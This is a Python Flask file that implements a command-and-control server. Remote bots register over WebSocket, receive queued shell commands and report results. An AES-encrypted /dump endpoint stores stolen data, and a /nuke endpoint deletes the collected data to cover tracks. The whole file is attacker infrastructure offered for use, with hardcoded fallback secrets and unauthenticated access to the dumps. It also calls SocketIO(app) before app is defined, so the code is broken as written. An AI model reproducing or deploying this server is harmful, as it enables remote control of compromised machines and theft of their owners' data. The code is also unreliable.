from flask import Flask, request, jsonify, send_from_directory, render_template
from datetime import datetime
import os
import json
import jwt
from functools import wraps
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64
import hashlib
from flask_socketio import SocketIO, emit
import eventlet
eventlet.monkey_patch()

socketio = SocketIO(app, cors_allowed_origins="*")
active_sockets = {}


command_queue = {}
command_results = {}

SECRET_KEY = os.getenv('SECRET_KEY', 'FromThe104WeSurveyTheOtherSideOfTheSea')
AES_SECRET = os.getenv("AES_SECRET", "FromThe104")


@socketio.on('connect')
def handle_connect():
    print("Client connected (no ID yet)")

@socketio.on('register')
def register_bot(data):
    bot_id = data.get("bot_id")
    if bot_id:
        active_sockets[bot_id] = request.sid
        print(f"Bot {bot_id} registered via WebSocket")

@socketio.on('response')
def handle_response(data):
    bot_id = data.get("bot_id")
    output = data.get("output")
    if bot_id and output:
        command_results[bot_id] = output
        print(f"[{bot_id}] response: {output}")

@socketio.on('disconnect')
def handle_disconnect():
    sid = request.sid
    for bot, socket_id in list(active_sockets.items()):
        if socket_id == sid:
            del active_sockets[bot]
            print(f"Bot {bot} disconnected")




def get_aes_key():
    return hashlib.sha256(AES_SECRET.encode()).digest()

def decrypt_aes(encrypted_data_b64):
    try:
        raw_data = base64.b64decode(encrypted_data_b64)
        iv = raw_data[:16]
        ciphertext = raw_data[16:]
        cipher = AES.new(get_aes_key(), AES.MODE_CBC, iv)
        plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
        return json.loads(plaintext.decode())
    except Exception as e:
        print(f"[DECRYPTION ERROR] {e}")
        return None
    
app = Flask(__name__)
DUMP_DIR  = 'dumps'
os.makedirs(DUMP_DIR, exist_ok=True)

def require_token(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization')
        if not token:
            return jsonify({'error': 'Missing token'}), 403
        try:
            jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
        except jwt.InvalidTokenError:
            return jsonify({'error': 'Invalid token'}), 403
        return f(*args, **kwargs)
    return decorated

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/dump', methods=['POST', 'PUT'])
@require_token
def dump_data():

    encrypted_data = request.get_data(as_text=True)
    decrypted = decrypt_aes(encrypted_data)

    if not decrypted:
        return jsonify({'error': 'Decryption failed'}), 400

    timestamp = datetime.utcnow().strftime('%Y-%m-%dT%H-%M-%S')
    filename = f'dump-{timestamp}.json'
    filepath = os.path.join(DUMP_DIR, filename)
    with open(filepath, 'w') as f:
        json.dump(decrypted, f, indent=2)
    return jsonify({'status': 'ok', 'file': filename})

@app.route('/dumps', methods=['GET'])
def list_dumps():
    files = [f for f in os.listdir(DUMP_DIR) if f.endswith('.json')]
    return jsonify(files)

@app.route('/dumps/<path:filename>', methods=['GET'])
def get_dump(filename):
    return send_from_directory(DUMP_DIR, filename)

@app.route('/command/<agent_id>', methods=['POST'])
@require_token
def send_command(agent_id):
    data = request.get_json()
    command = data.get("cmd")

    if not command:
        return jsonify({"error": "No command provided"}), 400

    command_queue[agent_id] = command

    # Push to WebSocket if online
    if agent_id in active_sockets:
        socketio.emit("command", {"cmd": command}, room=active_sockets[agent_id])
        return jsonify({"status": f"command '{command}' sent to {agent_id} via WebSocket"})

    return jsonify({"status": f"command '{command}' queued for {agent_id} (offline)"})

@app.route('/get/<agent_id>', methods=['GET'])
def get_command(agent_id):
    cmd = command_queue.pop(agent_id, None)
    if cmd:
        return jsonify({"cmd": cmd})
    return jsonify({"cmd": None})

@app.route('/report/<agent_id>', methods=['POST'])
def report_output(agent_id):
    data = request.get_json()
    output = data.get("output")

    if not output:
        return jsonify({"error": "Missing 'output'"}), 400

    command_results[agent_id] = output
    return jsonify({"status": "output received"})

@app.route('/results/<agent_id>', methods=['GET'])
@require_token
def get_results(agent_id):
    output = command_results.get(agent_id)
    if not output:
        return jsonify({"output": None})
    return jsonify({"output": output})

@app.route('/nuke', methods=['POST'])
@require_token
def nuke_server():
    command_queue.clear()
    command_results.clear()

    # Optional: delete dump files
    dump_path = os.path.join(app.root_path, 'dumps')
    if os.path.exists(dump_path):
        for f in os.listdir(dump_path):
            try:
                os.remove(os.path.join(dump_path, f))
            except Exception as e:
                print(f"Error deleting {f}: {e}")

    return jsonify({"status": "🔥 Server nuked. Data gone. Ghosted."})


if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000)
